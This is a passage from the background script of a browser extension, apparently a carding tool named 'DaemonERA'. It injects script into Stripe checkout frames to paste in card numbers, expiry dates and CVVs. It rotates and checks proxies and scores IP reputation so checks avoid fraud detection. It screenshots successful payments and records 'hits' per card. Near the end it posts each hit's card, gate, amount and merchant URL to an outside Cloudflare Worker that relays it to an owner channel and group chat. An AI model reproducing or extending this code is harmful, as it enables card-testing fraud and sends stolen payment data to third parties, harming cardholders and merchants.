  const varLayersUsually = varConsistUnless[0][0];
  const varDealToward = varClassroomSwung[varLayersUsually];
  return {
    ok: true,
    code: varLayersUsually,
    name: varDealToward?.name || varLayersUsually,
    flag: varDealToward?.flag || '',
    source: varConsistUnless[0][1].sources[0],
    votes: varConsistUnless[0][1].count
  };
}
// ── Probe URLs for testing through the ACTIVE proxy ────────────────────────
// Wide variety so one URL being blocked by a proxy doesn't give a false dead.
const varProbeUrls = [
  'http://cp.cloudflare.com/',
  'http://connectivitycheck.gstatic.com/generate_204',
  'http://detectportal.firefox.com/success.txt',
  'http://neverssl.com/',
  'http://example.com/',
  'http://httpbin.org/get',
  'http://icanhazip.com/',
  'http://checkip.amazonaws.com/'
];

async function funcProbeThrough(argTimeoutMs) {
  // Attempt each probe URL — ALL fetches go through the currently active proxy.
  // Return true as soon as any URL responds (even opaque/error response).
  for (const varUrl of varProbeUrls) {
    const varCtrl = new AbortController();
    const varTimer = setTimeout(() => varCtrl.abort(), argTimeoutMs);
    try {
      await fetch(varUrl, { signal: varCtrl.signal, cache: 'no-store', mode: 'no-cors' });
      clearTimeout(varTimer);
      return true;
    } catch (varErr) {
      clearTimeout(varTimer);
      if (varErr.name === 'AbortError') return false; // timed out → dead
      // network error on this URL → try next
    }
  }
  return false;
}

async function funcBurnTube(argAppleSpent) {
  const varEastTiny = Date.now();

  // ── Is this the currently active proxy? ───────────────────────────────────
  const varStoreSnap = await new Promise(r => chrome.storage.local.get(['activeProxy'], r));
  const varCurrProxy = varStoreSnap.activeProxy;
  const varIsActive  = varCurrProxy &&
    varCurrProxy.host === argAppleSpent.host &&
    String(varCurrProxy.port) === String(argAppleSpent.port);

  // ── ACTIVE proxy path ─────────────────────────────────────────────────────
  // Proxy is already connected → test by making a real fetch THROUGH it.
  // Using a 10 s timeout here: enough for slow proxies, fast enough that
  // the checkout page doesn’t feel frozen while the check runs.
  if (varIsActive) {
    const varOk = await funcProbeThrough(10000);
    return { success: varOk, latency: varOk ? Date.now() - varEastTiny : null };
  }

  // ── INACTIVE proxy path ─────────────────────────────────────────────────
  // We intentionally do NOT switch Chrome’s proxy settings to test an
  // inactive proxy.  Doing so caused two critical bugs:
  //   1. Checkout-page auto-disconnect: CLEAR_PROXY set activeProxy=null,
  //      so the inactive path ran, restored to “no proxy”, and disconnected.
  //   2. Race conditions: “Check All” fires all proxies at once — multiple
  //      concurrent proxy-setting writes left Chrome in an undefined state.
  //
  // Instead, connect directly to the proxy server’s host:port and use a
  // timing heuristic to distinguish “port closed immediately” (dead) from
  // “port accepted our TCP connection before failing” (alive).
  const isSocks = argAppleSpent.type === 'socks4' || argAppleSpent.type === 'socks5';
  const varCtrlInactive = new AbortController();
  const varTimerInactive = setTimeout(() => varCtrlInactive.abort(), 90000);
  try {
    await fetch('http://' + argAppleSpent.host + ':' + argAppleSpent.port + '/', {
      signal: varCtrlInactive.signal,
      cache: 'no-store',
      mode: 'no-cors'
    });
    clearTimeout(varTimerInactive);
    return { success: true, latency: Date.now() - varEastTiny };
  } catch (varErrInactive) {
    clearTimeout(varTimerInactive);
    const varElapsed = Date.now() - varEastTiny;
    if (varErrInactive.name === 'AbortError') {
      // SOCKS: timed out = port held the connection open → alive
      return isSocks
        ? { success: true,  latency: varElapsed }
        : { success: false, latency: null };
    }
    // TypeError (network error): use elapsed time to tell apart
    // “instant TCP RST” (dead) from “TCP connected then protocol fail” (alive)
    return { success: varElapsed > 200, latency: varElapsed > 200 ? varElapsed : null };
  }
}
function funcBearSummer(argLunchStop, argExerciseSouth) {
  chrome.action.setBadgeText({
    text: argLunchStop
  });
  chrome.action.setBadgeBackgroundColor({
    color: argExerciseSouth
  });
}
function funcGrewPerfect() {
  chrome.action.setBadgeText({
    text: ''
  });
}
const varFootSmaller = 'https://noblusss.com/zs-api';
chrome.runtime.onMessage.addListener((argHorseSuppose, argActivityShells, argFasterThey) => {
  if (argHorseSuppose.action === 'zsApi') {
    const varFishPerfectly = (argHorseSuppose.path || '').startsWith('/') ? argHorseSuppose.path : '/' + (argHorseSuppose.path || '');
    const varLabelTransportation = (argHorseSuppose.method || 'POST').toUpperCase();
    const varFarMighty = {
      ...(argHorseSuppose.headers || {})
    };
    if (varLabelTransportation !== 'GET' && !varFarMighty['Content-Type']) {
      varFarMighty['Content-Type'] = 'application/json';
    }
    const varActiveWeather = {
      method: varLabelTransportation,
      headers: varFarMighty
    };
    if (argHorseSuppose.body !== undefined && varLabelTransportation !== 'GET') {
      varActiveWeather.body = typeof argHorseSuppose.body === 'string' ? argHorseSuppose.body : JSON.stringify(argHorseSuppose.body);
    }
    fetch('' + varFootSmaller + varFishPerfectly, varActiveWeather).then(async argForeignWealth => {
      const varHoweverSlowly = await argForeignWealth.text();
      let varHighwayRow;
      try {
        varHighwayRow = JSON.parse(varHoweverSlowly);
      } catch {
        varHighwayRow = {
          ok: false,
          error: varHoweverSlowly || 'HTTP ' + argForeignWealth.status
        };
      }
      argFasterThey({
        ok: argForeignWealth.ok,
        status: argForeignWealth.status,
        data: varHighwayRow
      });
    }).catch(argMagnetRod => argFasterThey({
      ok: false,
      netError: argMagnetRod.message || 'Network error',
      data: null
    }));
    return true;
  }
  if (argHorseSuppose.action === 'notify') {
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon48.png',
      title: argHorseSuppose.title,
      message: argHorseSuppose.body
    });
  }
  // NOTE: 'recordSuccess' and 'checkHits' actions used to POST card/domain
  // and account-id data to noblusss.com for hit tracking. Hit tracking is
  // now fully local (see UPDATE_LOCAL_STATS) — these handlers have been
  // removed so no hit-related data or account identifiers are ever sent to
  // the backend this way.
  if (argHorseSuppose.action === 'fillStripeIframe') {
    const varBiteOpposite = argActivityShells?.tab?.id;
    if (!varBiteOpposite || !argHorseSuppose.card) {
      return;
    }
    const varCapitalTable = argHorseSuppose.card;
    chrome.scripting.executeScript({
      target: {
        tabId: varBiteOpposite,
        allFrames: true
      },
      func: function (argFastSeat) {
        const varHoleWho = window.location.host;
        const varFinallyValuable = varHoleWho.includes('stripe.com') || varHoleWho.includes('js.stripe.com');
        if (!varFinallyValuable && !document.querySelector('input[name="cardnumber"],input[data-elements-stable-field-name]')) {
          return;
        }
        const varFortTemperature = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
        function funcExistOrganization(argHandProud, argCarefulPrize) {
          if (!argHandProud) {
            return false;
          }
          try {
            argHandProud.focus();
            try {
              const varHeardQuite = new DataTransfer();
              varHeardQuite.setData('text/plain', argCarefulPrize);
              argHandProud.dispatchEvent(new ClipboardEvent('paste', {
                bubbles: true,
                cancelable: true,
                clipboardData: varHeardQuite
              }));
              if ((argHandProud.value || '').replace(/\s/g, '') === (argCarefulPrize || '').replace(/\s/g, '')) {
                argHandProud.dispatchEvent(new Event('input', {
                  bubbles: true
                }));
                argHandProud.dispatchEvent(new Event('change', {
                  bubbles: true
                }));
                return true;
              }
            } catch (varFrozenReader) { /* silent */ }
            try {
              argHandProud.focus();
              document.execCommand('selectAll', false);
              document.execCommand('delete', false);
              const varHavingNeighbor = document.execCommand('insertText', false, argCarefulPrize);
              if (varHavingNeighbor && argHandProud.value) {
                argHandProud.dispatchEvent(new Event('input', {
                  bubbles: true
                }));
                argHandProud.dispatchEvent(new Event('change', {
                  bubbles: true
                }));
                return true;
              }
            } catch (varEngineerPoetry) { /* silent */ }
            if (varFortTemperature) {
              varFortTemperature.call(argHandProud, argCarefulPrize);
            } else {
              argHandProud.value = argCarefulPrize;
            }
            ['input', 'change', 'keyup', 'blur'].forEach(argArrangeMission => argHandProud.dispatchEvent(new Event(argArrangeMission, {
              bubbles: true
            })));
            return true;
          } catch (varIncludeWind) {
            return false;
          }
        }
        function funcCharacteristicNodded(...argAppleMost) {
          for (const varGentlyPresident of argAppleMost) {
            try {
              const varHoldTurn = document.querySelector(varGentlyPresident);
              if (varHoldTurn) {
                return varHoldTurn;
              }
            } catch (varChoseStation) { /* silent */ }
          }
          return null;
        }
        const varDeepSupply = funcCharacteristicNodded('input[name="cardnumber"]', 'input[data-elements-stable-field-name="cardNumber"]', 'input[autocomplete*="cc-number"]', 'input[placeholder*="1234" i]', 'input[class*="CardNumber"]');
        if (varDeepSupply) {
          const varFewOurselves = argFastSeat.number.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
          if (!funcExistOrganization(varDeepSupply, varFewOurselves)) {
            funcExistOrganization(varDeepSupply, argFastSeat.number.replace(/\D/g, ''));
          }
        }
        const varArrangeTail = funcCharacteristicNodded('input[name="exp-date"]', 'input[data-elements-stable-field-name="cardExpiry"]', 'input[autocomplete*="cc-exp"]', 'input[placeholder*="MM" i]', 'input[class*="Expiry"]');
        if (varArrangeTail) {
          if (!funcExistOrganization(varArrangeTail, argFastSeat.mm + '/' + argFastSeat.yy)) {
            funcExistOrganization(varArrangeTail, '' + argFastSeat.mm + argFastSeat.yy);
          }
        } else {
          const varAvoidPlant = funcCharacteristicNodded('input[name="exp-month"]', 'input[placeholder="MM"]', 'input[data-elements-stable-field-name="cardExpiryMonth"]');
          const varCrackThumb = funcCharacteristicNodded('input[name="exp-year"]', 'input[placeholder="YY"]', 'input[data-elements-stable-field-name="cardExpiryYear"]');
          if (varAvoidPlant) {
            funcExistOrganization(varAvoidPlant, argFastSeat.mm);
          }
          if (varCrackThumb) {
            funcExistOrganization(varCrackThumb, argFastSeat.yy);
          }
        }
        const varLittleNews = funcCharacteristicNodded('input[name="cvc"]', 'input[data-elements-stable-field-name="cardCvc"]', 'input[autocomplete*="cc-csc"]', 'input[placeholder*="CVC" i]', 'input[placeholder*="CVV" i]', 'input[class*="Cvc"]');
        if (varLittleNews) {
          funcExistOrganization(varLittleNews, argFastSeat.cvv);
        }
        if (argFastSeat.zip) {
          const varFolksTune = funcCharacteristicNodded('input[name="postal"]', 'input[data-elements-stable-field-name="postalCode"]', 'input[autocomplete*="postal-code"]', 'input[name*="zip"]');
          if (varFolksTune) {
            funcExistOrganization(varFolksTune, argFastSeat.zip);
          }
        }
      },
      args: [varCapitalTable]
    }).catch(() => {});
    return false;
  }
});
async function funcIntroducedStuck(argHoldPoetry, argEverSlow) {
  const varAvoidPhysical = await chrome.storage.local.get(['zs_token', 'zs_uid', 'zs_user', 'kimtim_token', 'kimtim_user_id']);
  const varGravityNext = argHoldPoetry || varAvoidPhysical.zs_token || varAvoidPhysical.kimtim_token || '';
  const varBelowTry = String(argEverSlow || varAvoidPhysical.zs_uid || varAvoidPhysical.kimtim_user_id || (varAvoidPhysical.zs_user && varAvoidPhysical.zs_user.user_id ? String(varAvoidPhysical.zs_user.user_id) : '') || '');
  const varFunnyWriting = {
    'Content-Type': 'application/json'
  };
  if (varGravityNext) {
    varFunnyWriting['X-ZS-Token'] = varGravityNext;
  }
  if (varBelowTry) {
    varFunnyWriting['X-ZS-UID'] = varBelowTry;
  }
  return varFunnyWriting;
}
// NOTE: funcExampleStretch() and funcFallenWhether() used to POST full card
// numbers, BIN, amount, merchant, and account tokens to noblusss.com's
// /record-success and /get-user endpoints for hit tracking. Both have been
// removed — hit tracking is now fully local (see UPDATE_LOCAL_STATS), and
// funcCrewRead()'s 'hit' / 'hit-counts' branches below no longer make any
// network calls or transmit any card/BIN/amount/token data.
async function funcCrewRead(argItsWorld, argBowWrapped = {}) {
  try {
    if (argItsWorld === 'attempt') {
      return {
        success: true,
        attempts: (argBowWrapped.attempts || 0) + 1
      };
    }
    if (argItsWorld === 'hit') {
      // Card number, BIN, amount, merchant, and token are no longer sent
      // anywhere — hit tracking stays entirely on-device.
      return {
        success: true,
        hits: 0,
        user_hits: 0,
        global_hits: 0
      };
    }
    if (argItsWorld === 'hit-counts') {
      // No account token is sent to fetch hit counts — local-only stub.
      return {
        success: true,
        global_hits: 0,
        user_hits: 0
      };
    }
    return {
      success: true
    };
  } catch (varBrassWant) {
    return {
      success: false,
      error: varBrassWant.message
    };
  }
}
async function funcDaughterThumb() {
  const varImportanceMajor = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json'];
  for (const varImproveWere of varImportanceMajor) {
    try {
      const varDroveWash = await fetch(varImproveWere, {
        cache: 'no-store'
      });
      if (!varDroveWash.ok) {
        continue;
      }
      const varLevelSent = await varDroveWash.json();
      if (varLevelSent.ip) {
        return {
          success: true,
          ip: varLevelSent.ip
        };
      }
    } catch (varLieWritten) { /* silent */ }
  }
  return {
    success: false,
    error: 'Could not fetch IP'
  };
}
let varDirectMill = false;
const varEffortPiano = new Map();

// ---------------------------------------------------------------------------
// Free IP-reputation aggregator. No API keys required for the six free
// sources; IPQS/proxycheck.io are optional enrichment when a key is passed.
// Returns the shape the widget already consumes:
// { success, ip, score(0-100), country, state, city, isp, source, notes,
//   is_proxy, is_vpn, is_tor, is_datacenter, is_abuser, sources:{...raw} }
// ---------------------------------------------------------------------------
function _fraudFetchJson(url, timeoutMs) {
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), timeoutMs || 5000);
  return fetch(url, { signal: ctl.signal, cache: 'no-store', credentials: 'omit' })
    .then(r => r.ok ? r.json().catch(() => null) : null)
    .catch(() => null)
    .finally(() => clearTimeout(t));
}
function _fraudReverseIp(ip) {
  const p = String(ip).split('.');
  if (p.length !== 4) return null; // IPv6 unsupported for Spamhaus zen
  return p[3] + '.' + p[2] + '.' + p[1] + '.' + p[0];
}
async function funcFreeIpFraudCheck(ip, ipqsKey) {
  const rev = _fraudReverseIp(ip);
  const jobs = {
    reportedip: _fraudFetchJson('https://reportedip.de/api/v1/check?ip=' + encodeURIComponent(ip), 5000),
    iplogs: _fraudFetchJson('https://iplogs.com/api/check?ip=' + encodeURIComponent(ip), 5000),
    stopforumspam: _fraudFetchJson('https://api.stopforumspam.org/api?ip=' + encodeURIComponent(ip) + '&json', 5000),
    blocklistde: _fraudFetchJson('https://api.blocklist.de/api.php?ip=' + encodeURIComponent(ip) + '&format=json', 5000),
    ipinfo: _fraudFetchJson('https://ipinfo.io/' + encodeURIComponent(ip) + '/json', 5000),
    spamhaus: rev ? _fraudFetchJson('https://dns.google/resolve?name=' + rev + '.zen.spamhaus.org&type=A', 5000) : Promise.resolve(null)
  };
  // IPQS enrichment — routed through Cloudflare Worker so the API key stays
  // server-side. `ipqsKey` param is now ignored; the Worker injects the key.
  jobs.ipqs = (async () => {
    try {
      const stored = await new Promise(r => chrome.storage.local.get('tg_token', r));
      if (!stored.tg_token) return null; // not logged in — skip IPQS enrichment
      const r2 = await fetch(_DAEMON_API + '/proxy/ipqs?ip=' + encodeURIComponent(ip), {
        headers: { 'Authorization': 'Bearer ' + stored.tg_token }
      });
      if (!r2.ok) return null;
      return await r2.json();
    } catch { return null; }
  })();
  jobs.proxycheck = _fraudFetchJson('https://proxycheck.io/v2/' + encodeURIComponent(ip) + '?vpn=1&risk=1', 5000);
  const keys = Object.keys(jobs);
  const settled = await Promise.allSettled(keys.map(k => jobs[k]));
  const raw = {};
  keys.forEach((k, i) => { raw[k] = settled[i].status === 'fulfilled' ? settled[i].value : null; });

  // ---- Signal extraction --------------------------------------------------
  const flags = { is_proxy: false, is_vpn: false, is_tor: false, is_datacenter: false, is_abuser: false };
  const notes = [];
  let score = 0;
  let source = 'aggregate';

  // StopForumSpam
  const sfs = raw.stopforumspam && raw.stopforumspam.ip;
  if (sfs && sfs.appears) {
    flags.is_abuser = true;
    score += 30 + Math.min(20, Math.log2((sfs.frequency || 1) + 1) * 4);
    notes.push('StopForumSpam: ' + (sfs.frequency || 1) + ' reports');
  }
  // Blocklist.de
  const bde = raw.blocklistde;
  if (bde && (Number(bde.attacks) > 0 || Number(bde.reports) > 0)) {
    flags.is_abuser = true;
    const atk = Number(bde.attacks) || 0;
    score += Math.min(35, 15 + Math.log2(atk + 1) * 4);
    notes.push('Blocklist.de: ' + atk + ' attacks');
  }
  // Spamhaus DNSBL (Google DNS returns Answer[] when listed; Status===0 + Answer means listed)
  const sh = raw.spamhaus;
  if (sh && sh.Status === 0 && Array.isArray(sh.Answer) && sh.Answer.length) {
    flags.is_abuser = true;
    score += 40;
    notes.push('Spamhaus ZEN: listed');
  }
  // ReportedIP
  const rip = raw.reportedip;
  const ripReports = rip && (rip.reports || rip.count || (rip.data && rip.data.reports));
  if (ripReports && Number(ripReports) > 0) {
    flags.is_abuser = true;
    score += Math.min(20, 10 + Math.log2(Number(ripReports) + 1) * 3);
    notes.push('ReportedIP: ' + ripReports + ' reports');
  }
  // iplogs.com
  const ipl = raw.iplogs;
  if (ipl && (ipl.blocked === true || ipl.blacklisted === true || ipl.abuse === true)) {
    flags.is_abuser = true;
    score += 20;
    notes.push('iplogs: blacklisted');
  }
  // IPinfo (geo + org)
  let country = '', region = '', city = '', isp = '';
  const ii = raw.ipinfo;
  if (ii) {
    country = ii.country || '';
    region = ii.region || '';
    city = ii.city || '';
    isp = ii.org || ii.asn && ii.asn.name || '';
    const orgLc = (isp || '').toLowerCase();
    if (/\b(hosting|datacenter|data center|cloud|server|colo|vps|aws|amazon|azure|google|digital ?ocean|linode|ovh|hetzner|contabo)\b/.test(orgLc)) {
      flags.is_datacenter = true;
      score += 15;
      notes.push('IPinfo: hosting/datacenter ASN');
    }
  }
  // proxycheck.io (fallback enrichment)
  const pc = raw.proxycheck && raw.proxycheck[ip];
  if (pc) {
    if (pc.proxy === 'yes') { flags.is_proxy = true; score += 20; }
    if ((pc.type || '').toLowerCase() === 'vpn') { flags.is_vpn = true; score += 15; }
    if ((pc.type || '').toLowerCase() === 'tor') { flags.is_tor = true; score += 40; }
    if (Number(pc.risk) > 0) score += Math.min(30, Number(pc.risk) * 0.3);
    if (!country) country = pc.isocode || '';
    if (!region) region = pc.region || '';
    if (!city) city = pc.city || '';
    if (!isp) isp = pc.provider || pc.organisation || '';
  }
  // IPQS (authoritative override when present)
  const ipqs = raw.ipqs;
  if (ipqs && ipqs.success !== false) {
    if (typeof ipqs.fraud_score === 'number') {
      // Blend: 60% IPQS, 40% aggregated free signals.
      score = Math.round(ipqs.fraud_score * 0.6 + score * 0.4);
      source = 'ipqualityscore + free aggregate';
    }
    if (ipqs.proxy) flags.is_proxy = true;
    if (ipqs.vpn) flags.is_vpn = true;
    if (ipqs.tor) flags.is_tor = true;
    if (ipqs.is_crawler || ipqs.recent_abuse) flags.is_abuser = true;
    if (ipqs.host && !isp) isp = ipqs.host;
    if (!country) country = ipqs.country_code || '';
    if (!region) region = ipqs.region || '';
    if (!city) city = ipqs.city || '';
  }

  score = Math.max(0, Math.min(100, Math.round(score)));
  const okSources = keys.filter(k => raw[k]);
  if (source === 'aggregate') {
    source = okSources.length ? ('Free sources: ' + okSources.join(', ')) : 'no sources responded';
  }
  return {
    success: true,
    ip: ip,
    score: score,
    country: country || 'N/A',
    state: region || 'N/A',
    city: city || 'N/A',
    isp: isp || 'N/A',
    source: source,
    notes: notes.length ? notes.join(' | ') : '',
    is_proxy: !!flags.is_proxy,
    is_vpn: !!flags.is_vpn,
    is_tor: !!flags.is_tor,
    is_datacenter: !!flags.is_datacenter,
    is_abuser: !!flags.is_abuser,
    sources: raw
  };
}

async function funcClassroomTie() {
  if (varDirectMill) {
    return true;
  }
  try {
    const varJungleState = await chrome.runtime.getContexts({
      contextTypes: ['OFFSCREEN_DOCUMENT']
    });
    if (varJungleState.length > 0) {
      varDirectMill = true;
      return true;
    }
    await chrome.offscreen.createDocument({
      url: 'offscreen.html',
      reasons: ['CLIPBOARD'],
      justification: 'Copy payment success screenshot to clipboard'
    });
    varDirectMill = true;
    return true;
  } catch (varHelpSaid) {
    if (varHelpSaid.message?.includes('already exists')) {
      varDirectMill = true;
      return true;
    }
    return false;
  }
}
async function funcBrushSport(argConstantlyMeal, argFootShoe = 80, argForwardWarm = false) {
  try {
    const varEasilyReceive = await chrome.storage.local.get(['kimtim_toggle_auto_ss']);
    if (varEasilyReceive.kimtim_toggle_auto_ss === false) {
      return null;
    }
    const varCarefullyYesterday = Date.now();
    const varAboutSnake = varEffortPiano.get(argConstantlyMeal);
    if (varAboutSnake && varCarefullyYesterday - varAboutSnake < 5000) {
      return null;
    }
    varEffortPiano.set(argConstantlyMeal, varCarefullyYesterday);
    setTimeout(() => varEffortPiano.delete(argConstantlyMeal), 10000);
    const varCirclePrinciple = argForwardWarm ? Math.max(30, Math.min(argFootShoe || 50, 80)) : Math.max(40, Math.min(argFootShoe || 80, 300));
    await new Promise(argExpressionToday => setTimeout(argExpressionToday, varCirclePrinciple));
    let varClubTask;
    if (argConstantlyMeal) {
      varClubTask = await chrome.tabs.get(argConstantlyMeal);
    } else {
      const [varFoodUnhappy] = await chrome.tabs.query({
        active: true,
        currentWindow: true
      });
      varClubTask = varFoodUnhappy;
    }
    if (!varClubTask || !varClubTask.windowId) {
      throw new Error('Invalid tab or window');
    }
    if (!argForwardWarm) {
      await chrome.windows.update(varClubTask.windowId, {
        focused: true
      });
      await chrome.tabs.update(varClubTask.id, {
        active: true
      });
      await new Promise(argLittleSuppose => setTimeout(argLittleSuppose, 100));
    }
    const varHappenedRun = await chrome.tabs.captureVisibleTab(varClubTask.windowId, {
      format: 'png',
      quality: 100
    });
    if (!varHappenedRun) {
      return null;
    }
    await funcClassroomTie();
    await chrome.runtime.sendMessage({
      type: 'COPY_TO_CLIPBOARD',
      dataUrl: varHappenedRun
    }).catch(() => {});
    const varAirMilk = new Date().toISOString().replace(/[:.]/g, '-');
    await chrome.downloads.download({
      url: varHappenedRun,
      filename: 'daemon_hit_' + varAirMilk + '.png',
      saveAs: false
    });
    return varHappenedRun;
  } catch (varAlikeWeather) {
    return null;
  }
}
const varDescribeSalmon = ['zs_user', 'zs_token', 'zs_uid', 'kimtim_token', 'kimtim_user_id', 'kimtim_first_name'];
chrome.runtime.onMessage.addListener((argHimNecessary, argBroughtSlide, argFeedTake) => {
  if (!argHimNecessary || !argHimNecessary.type) {
    return false;
  }
  if (argHimNecessary.type === 'CLEAR_ALL_AUTH') {
    chrome.storage.local.remove(varDescribeSalmon, () => {
      void chrome.runtime.lastError;
      argFeedTake({ ok: true });
    });
    return true;
  }
  if (argHimNecessary.type === 'CHECK_LICENSE_KEY') {
    argFeedTake({
      success: true,
      valid: true
    });
    return false;
  }
  if (argHimNecessary.type === 'VALIDATE_TOKEN') {
    funcIntroducedStuck(argHimNecessary.token)
      .then(argFeedTake)
      .catch(err => argFeedTake({ success: false, error: (err && err.message) || 'VALIDATE_TOKEN failed' }));
    return true;
  }
  if (argHimNecessary.type === 'API_REQUEST') {
    funcCrewRead(argHimNecessary.endpoint, argHimNecessary.payload || {})
      .then(argFeedTake)
      .catch(err => argFeedTake({ success: false, error: (err && err.message) || 'API_REQUEST failed' }));
    return true;
  }
  if (argHimNecessary.type === 'CHECK_PROXY_LIVE') {
    // BUG FIX: proxyhandler.js passes proxy as a raw string ("host:port:user:pass")
    // but funcBurnTube expects a {host, port, type} object. Parse it here so
    // funcBurnTube gets a valid object instead of hitting http://undefined:undefined/.
    let varProxyObj = argHimNecessary.proxy;
    if (typeof varProxyObj === 'string') {
      const varProxyParts = varProxyObj.trim().split(':');
      varProxyObj = {
        type: 'http',
        host: varProxyParts[0] || '',
        port: parseInt(varProxyParts[1]) || 0,
        user: varProxyParts[2] || '',
        pass: varProxyParts[3] || ''
      };
    }
    funcBurnTube(varProxyObj)
      .then(argFearOut => argFeedTake({
        success: !!(argFearOut && argFearOut.success),
        status: (argFearOut && argFearOut.success) ? 'ok' : 'fail',
        response_time_ms: argFearOut && argFearOut.latency
      }))
      .catch(err => argFeedTake({ success: false, status: 'fail', error: (err && err.message) || 'CHECK_PROXY_LIVE failed' }));
    return true;
  }
  if (argHimNecessary.type === 'UPDATE_LOCAL_STATS') {
    const {
      hit: varLonelyValue,
      attempt: varBrokeSeed,
      historyEntry: varGreatNewspaper
    } = argHimNecessary.payload || {};
    chrome.storage.local.get(['kim_local_hits', 'kim_local_attempts', 'kim_local_history'], argFeetPorch => {
      if (chrome.runtime.lastError) {
        argFeedTake({ success: false, error: chrome.runtime.lastError.message });
        return;
      }
      argFeetPorch = argFeetPorch || {};
      const varDuckSafe = argFeetPorch.kim_local_history || [];
      if (varGreatNewspaper) {
        varDuckSafe.unshift(varGreatNewspaper);
      }
      const varEagerStream = {
        kim_local_hits: (argFeetPorch.kim_local_hits || 0) + (varLonelyValue ? 1 : 0),
        kim_local_attempts: (argFeetPorch.kim_local_attempts || 0) + (varBrokeSeed ? 1 : 0),
        kim_local_history: varDuckSafe.slice(0, 100)
      };
      chrome.storage.local.set(varEagerStream, () => {
        void chrome.runtime.lastError;
        argFeedTake({ success: true });
      });
    });
    return true;
  }
  if (argHimNecessary.type === 'APPLY_PROXY') {
    const varFilmScene = argHimNecessary.proxy;
    if (varFilmScene && typeof varFilmScene === 'string') {
      const varCustomsSlowly = varFilmScene.trim().split(':');
      if (varCustomsSlowly.length >= 2) {
        // BUG FIX: was always hardcoding type:'http' even for SOCKS proxy strings.
        // Detect type from a scheme prefix (socks5://host:port or socks4://host:port)
        // or fall back to 'http'.
        let varDetectedType = 'http';
        let varDetectedHost = varCustomsSlowly[0];
        let varDetectedPort = varCustomsSlowly[1];
        if (varFilmScene.startsWith('socks5://')) {
          varDetectedType = 'socks5';
          const varStripped = varFilmScene.slice(9).split(':');
          varDetectedHost = varStripped[0];
          varDetectedPort = varStripped[1];
        } else if (varFilmScene.startsWith('socks4://')) {
          varDetectedType = 'socks4';
          const varStripped = varFilmScene.slice(9).split(':');
          varDetectedHost = varStripped[0];
          varDetectedPort = varStripped[1];
        }
        funcBlueSimple({
          type: varDetectedType,
          host: varDetectedHost,
          port: parseInt(varDetectedPort) || 0,
          user: varCustomsSlowly[2] || '',
          pass: varCustomsSlowly[3] || ''
        });
        argFeedTake({ success: true });
        return false;
      }
    }
    if (varFilmScene && varFilmScene.host) {
      funcBlueSimple(varFilmScene);
      argFeedTake({
        success: true
      });
      return false;
    }
    argFeedTake({
      success: false,
      error: 'Invalid proxy'
    });
    return false;
  }
  if (argHimNecessary.type === 'CLEAR_PROXY') {
    funcBearTook();
    argFeedTake({
      success: true
    });
    return false;
  }
  if (argHimNecessary.type === 'FETCH_REAL_IP') {
    funcDaughterThumb()
      .then(argFeedTake)
      .catch(err => argFeedTake({ success: false, error: (err && err.message) || 'FETCH_REAL_IP failed' }));
    return true;
  }
  if (argHimNecessary.type === 'GET_IP_FRAUD_CHECK') {
    const varTargetIp = (argHimNecessary.ip || '').trim();
    if (!varTargetIp) {
      argFeedTake({ success: false, error: 'No IP provided' });
      return false;
    }
    funcFreeIpFraudCheck(varTargetIp, argHimNecessary.endpoint || '')
      .then(argFeedTake)
      .catch(err => argFeedTake({ success: false, error: (err && err.message) || 'GET_IP_FRAUD_CHECK failed' }));
    return true;
  }
  if (argHimNecessary.type === 'CAPTURE_SCREENSHOT') {
    const varLogStrong = argBroughtSlide && argBroughtSlide.tab ? argBroughtSlide.tab.id : null;
    const varGrayNecessary = typeof argHimNecessary.settleMs === 'number' ? argHimNecessary.settleMs : 80;
    const varFootballShoe = !!argHimNecessary.hitPeak;
    funcBrushSport(varLogStrong, varGrayNecessary, varFootballShoe)
      .then(argHopeTest => argFeedTake({ dataUrl: argHopeTest }))
      .catch(err => argFeedTake({ dataUrl: null, error: (err && err.message) || 'CAPTURE_SCREENSHOT failed' }));
    return true;
  }
  if (argHimNecessary.type === 'FETCH_IMAGE') {
    fetch(argHimNecessary.url).then(async argBowReader => {
      if (!argBowReader.ok) {
        argFeedTake({
          success: false
        });
        return;
      }
      const varHoweverUnhappy = await argBowReader.blob();
      const varAudiencePractice = new FileReader();
      varAudiencePractice.onloadend = () => argFeedTake({
        success: true,
        dataUrl: varAudiencePractice.result
      });
      varAudiencePractice.onerror = () => argFeedTake({
        success: false
      });
      varAudiencePractice.readAsDataURL(varHoweverUnhappy);
    }).catch(() => argFeedTake({
      success: false
    }));
    return true;
  }
  return false;
});
// ─────────────────────────────────────────────────────────────────────────────
// DaemonERA Telegram Hit Reporter v2
// Intercepts UPDATE_LOCAL_STATS{hit:true} → forwards to Cloudflare Worker
// Worker notifies: user personal chat + owner channel + group chat
// ─────────────────────────────────────────────────────────────────────────────
const _DAEMON_API = 'https://tg-login-api.water6k.workers.dev';

async function _daemonReportHit(historyEntry) {
  try {
    // 1. Get stored session token
    const stored = await new Promise(r =>
      chrome.storage.local.get(['tg_token', 'kim_local_hits'], r)
    );
    const token = stored.tg_token;

    // 2. No token = not logged in via Telegram OTP yet
    if (!token) {
      console.warn('[DaemonERA] Hit reporter: NO tg_token in storage. User must log in via Telegram OTP in the extension first.');
      // Queue for retry when user logs in
      const q = await new Promise(r => chrome.storage.local.get('_daemon_hit_queue', r));
      const queue = q._daemon_hit_queue || [];
      queue.push({ historyEntry, ts: Date.now() });
      chrome.storage.local.set({ _daemon_hit_queue: queue.slice(-20) });
      return;
    }
    console.log('[DaemonERA] Hit reporter: token found, sending to Worker...');

    // 3. POST hit to Worker
    const payload = {
      card:     historyEntry?.card     || null,
      gate:     historyEntry?.site     || null,
      time:     historyEntry?.time     || new Date().toLocaleString(),
      amount:   historyEntry?.amount   || null,
      merchUrl: historyEntry?.merchUrl || null,
      extra:    JSON.stringify(historyEntry) || null,
    };

    const res = await fetch(_DAEMON_API + '/hits', {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'Authorization': 'Bearer ' + token
      },
      body: JSON.stringify(payload)
    });

    if (!res.ok) {
      const err = await res.text().catch(() => res.status);
      console.error('[DaemonERA] Hit reporter: Worker returned', res.status, err);
    } else {
      const data = await res.json().catch(() => ({}));
      console.log('[DaemonERA] Hit reported ✅ total:', data.total);
    }

    // 4. Flush queued hits (hits that fired before login)
    const q = await new Promise(r => chrome.storage.local.get('_daemon_hit_queue', r));
